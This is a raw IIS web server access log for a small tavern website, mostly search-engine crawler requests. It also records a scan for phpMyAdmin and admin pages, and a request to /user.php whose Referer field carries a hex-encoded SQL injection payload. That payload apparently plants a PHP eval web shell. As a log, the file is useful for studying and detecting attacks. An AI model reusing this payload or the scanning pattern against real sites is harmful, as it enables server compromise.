#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-16 07:56:02
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-16 07:56:02 GET / - 180.153.236.35 HTTP/1.1 Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0) http://www.kaiparatavern.co.nz/ 200 8209 263
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-16 14:14:39 GET /robots.txt - 5.45.207.33 HTTP/1.1 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 404 1405 206
2018-09-16 14:14:43 GET /favicon.ico - 5.45.207.33 HTTP/1.1 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 404 1405 238
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-16 15:55:27
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-16 15:55:27 GET /robots.txt - 159.69.56.54 HTTP/1.0 yoys.net - 404 1424 113
2018-09-16 15:55:28 GET / - 159.69.56.54 HTTP/1.0 yoys.net - 200 34855 103
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-16 17:02:26
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-16 17:02:26 GET /images/logo.png - 66.249.79.74 HTTP/1.1 Googlebot-Image/1.0 - 304 211 252
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-16 17:32:33
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-16 17:32:32 GET /images/2.jpg - 66.249.79.72 HTTP/1.1 Googlebot-Image/1.0 - 304 211 249
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-16 18:40:35
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-16 18:40:35 GET /robots.txt - 5.45.207.33 HTTP/1.1 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 404 1405 206
2018-09-16 18:40:35 GET /robots.txt - 5.45.207.33 HTTP/1.1 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 404 1405 202
2018-09-16 18:40:39 GET / - 5.45.207.33 HTTP/1.1 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 200 8209 288
2018-09-16 18:40:39 GET / - 5.45.207.33 HTTP/1.1 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 200 6457 284
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-16 21:33:15
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-16 21:33:15 GET /robots.txt - 66.249.79.72 HTTP/1.1 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 404 1405 237
2018-09-16 21:33:15 GET /images/9.jpg - 66.249.79.72 HTTP/1.1 Googlebot-Image/1.0 - 304 211 249
2018-09-16 21:43:22 GET /images/work-img9.jpg - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 304 211 257
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-16 22:03:00
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-16 22:03:00 GET /images/10.jpg - 66.249.79.74 HTTP/1.1 Googlebot-Image/1.0 - 304 210 250
2018-09-16 22:12:59 GET /images/work-img3.jpg - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 304 211 257
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-16 22:54:21
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-16 22:54:21 GET /admin/index.php - 83.103.40.28 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/56.0.2924.87+Safari/537.36 - 404 1405 207
2018-09-16 22:54:21 GET /dbadmin/index.php - 83.103.40.28 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/56.0.2924.87+Safari/537.36 - 404 1405 209
2018-09-16 22:54:22 GET /MyAdmin/index.php - 83.103.40.28 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/56.0.2924.87+Safari/537.36 - 404 1405 209
2018-09-16 22:54:22 GET /phpMyAdmin-4.8.0-all-languages/index.php - 83.103.40.28 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/56.0.2924.87+Safari/537.36 - 404 1405 232
2018-09-16 22:54:24 GET /phpMyAdmin-4.8.0/index.php - 83.103.40.28 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/56.0.2924.87+Safari/537.36 - 404 1405 218
2018-09-16 22:54:24 GET /phpMyAdmin-4.8.1-all-languages/index.php - 83.103.40.28 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/56.0.2924.87+Safari/537.36 - 404 1405 232
2018-09-16 22:54:25 GET /phpMyAdmin-4.8.1/index.php - 83.103.40.28 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/56.0.2924.87+Safari/537.36 - 404 1405 218
2018-09-16 22:54:25 GET /phpmyadmin/index.php - 83.103.40.28 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/56.0.2924.87+Safari/537.36 - 404 1405 212
2018-09-16 22:54:26 GET /phpmyAdmin/index.php - 83.103.40.28 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/56.0.2924.87+Safari/537.36 - 404 1405 212
2018-09-16 22:54:26 GET /phpMyAdmin/index.php - 83.103.40.28 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/56.0.2924.87+Safari/537.36 - 404 1405 212
2018-09-16 22:54:27 GET /pma/index.php - 83.103.40.28 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_12_3)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/56.0.2924.87+Safari/537.36 - 404 1405 205
2018-09-16 23:03:09 GET /images/work-img10.jpg - 66.249.79.72 HTTP/1.1 Googlebot-Image/1.0 - 304 211 258
2018-09-16 23:13:11 GET /images/team1.jpg - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 304 211 253
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-17 00:54:26
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-17 00:54:26 GET /images/6.jpg - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 304 211 249
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-17 01:10:39
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-17 01:10:39 GET /robots.txt - 5.45.207.33 HTTP/1.1 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 404 1405 206
2018-09-17 01:10:39 GET /robots.txt - 5.45.207.33 HTTP/1.1 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 404 1405 202
2018-09-17 01:10:42 GET / - 5.45.207.33 HTTP/1.1 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 200 8209 288
2018-09-17 01:10:43 GET / - 5.45.207.33 HTTP/1.1 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 200 6457 284
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-17 01:34:42
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-17 01:34:42 GET /images/1.jpg - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 304 211 249
2018-09-17 01:37:53 GET /robots.txt - 66.249.79.234 HTTP/1.1 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 404 1405 233
2018-09-17 01:37:53 GET / - 66.249.79.234 HTTP/1.1 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 200 8209 296
2018-09-17 01:43:23 GET /user.php - 47.94.216.136 HTTP/1.1 Opera/9.80+(Windows+NT+6.1;+U;+en)+Presto/2.8.131+Version/11.11 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:290:"*/+union+select+1,0x272f2a,3,4,5,6,7,8,0x7b24797979275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a337034597935776148416e4c4363385033426f6343426c646d46734b435266554539545646743465486834654868644b547367507a346e4b513d3d2729293b2f2f7d,10--+-";s:2:"id";s:3:"'/*";} 404 1405 590
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-17 02:24:44
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-17 02:24:43 GET /images/work-img11.jpg - 66.249.79.74 HTTP/1.1 Googlebot-Image/1.0 - 304 211 258
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-17 02:44:30
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-17 02:44:29 GET /images/team2.jpg - 66.249.79.74 HTTP/1.1 Googlebot-Image/1.0 - 304 211 253
2018-09-17 02:54:49 GET /images/work-img8.jpg - 66.249.79.72 HTTP/1.1 Googlebot-Image/1.0 - 304 211 257
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-17 03:14:31
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-17 03:14:31 GET /images/11.jpg - 66.249.79.74 HTTP/1.1 Googlebot-Image/1.0 - 304 211 250
2018-09-17 03:24:21 GET /images/work-img4.jpg - 66.249.79.72 HTTP/1.1 Googlebot-Image/1.0 - 304 211 257
2018-09-17 03:34:12 GET /images/7.jpg - 66.249.79.72 HTTP/1.1 Googlebot-Image/1.0 - 304 211 249
2018-09-17 03:44:00 GET /images/5.jpg - 66.249.79.74 HTTP/1.1 Googlebot-Image/1.0 - 304 211 249
2018-09-17 03:54:25 GET /images/team3.jpg - 66.249.79.72 HTTP/1.1 Googlebot-Image/1.0 - 304 211 253
2018-09-17 03:54:27 GET /images/team4.jpg - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 304 211 253
2018-09-17 04:04:12 GET /css/images/cd-top-arrow.svg - 122.57.32.16 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/65.0.3325.183+Safari/537.36+Vivaldi/1.96.1147.64 http://kaiparatavern.co.nz/css/style.css 404 1405 411
2018-09-17 04:04:13 GET /fonts/fontawesome-webfont.woff2 - 122.57.32.16 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/65.0.3325.183+Safari/537.36+Vivaldi/1.96.1147.64 http://kaiparatavern.co.nz/css/font-awesome.min.css 404 1405 434
2018-09-17 04:04:13 GET /fonts/fontawesome-webfont.woff - 122.57.32.16 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/65.0.3325.183+Safari/537.36+Vivaldi/1.96.1147.64 http://kaiparatavern.co.nz/css/font-awesome.min.css 404 1405 433
2018-09-17 04:04:13 GET /images/work-img12.jpg - 66.249.79.72 HTTP/1.1 Googlebot-Image/1.0 - 304 211 258
2018-09-17 04:04:15 GET /favicon.ico - 122.57.32.16 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/65.0.3325.183+Safari/537.36+Vivaldi/1.96.1147.64 http://kaiparatavern.co.nz/ 404 1405 382
2018-09-17 04:14:09 GET /images/8.jpg - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 304 211 249
2018-09-17 04:21:28 GET /robots.txt - 46.229.168.135 HTTP/1.1 Mozilla/5.0+(compatible;+SemrushBot/2~bl;++http://www.semrush.com/bot.html) - 404 1424 198
2018-09-17 04:21:28 GET / - 46.229.168.145 HTTP/1.1 Mozilla/5.0+(compatible;+SemrushBot/2~bl;++http://www.semrush.com/bot.html) - 200 8228 207
2018-09-17 04:24:14 GET /images/work-img1.jpg - 66.249.79.72 HTTP/1.1 Googlebot-Image/1.0 - 304 210 257
2018-09-17 04:34:21 GET /images/work-img7.jpg - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 304 211 257
2018-09-17 04:34:37 GET /robots.txt - 54.36.150.125 HTTP/1.1 Mozilla/5.0+(compatible;+AhrefsBot/5.2;++http://ahrefs.com/robot/) - 404 1405 184
2018-09-17 04:34:39 GET /images/11.jpg - 54.36.148.152 HTTP/1.1 Mozilla/5.0+(compatible;+AhrefsBot/5.2;++http://ahrefs.com/robot/) - 200 0 187
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-17 04:54:20
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-17 04:54:20 GET /images/3.jpg - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 304 211 249
2018-09-17 05:04:11 GET /images/12.jpg - 66.249.79.72 HTTP/1.1 Googlebot-Image/1.0 - 304 211 250
2018-09-17 05:14:12 GET /images/work-img6.jpg - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 304 211 257
2018-09-17 05:17:42 GET / - 121.74.85.32 HTTP/1.1 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_13_1)+AppleWebKit/604.3.5+(KHTML,+like+Gecko)+Version/11.0.1+Safari/604.3.5 - 200 0 363
2018-09-17 05:24:32 GET /images/xtra_logo.png - 66.249.79.72 HTTP/1.1 Googlebot-Image/1.0 - 304 210 257
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-17 05:44:35
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-17 05:44:35 GET /images/work-img2.jpg - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 304 211 257
#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-09-17 06:04:33
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-09-17 06:04:32 GET /favicon.ico - 66.249.79.76 HTTP/1.1 Googlebot-Image/1.0 - 404 1405 198
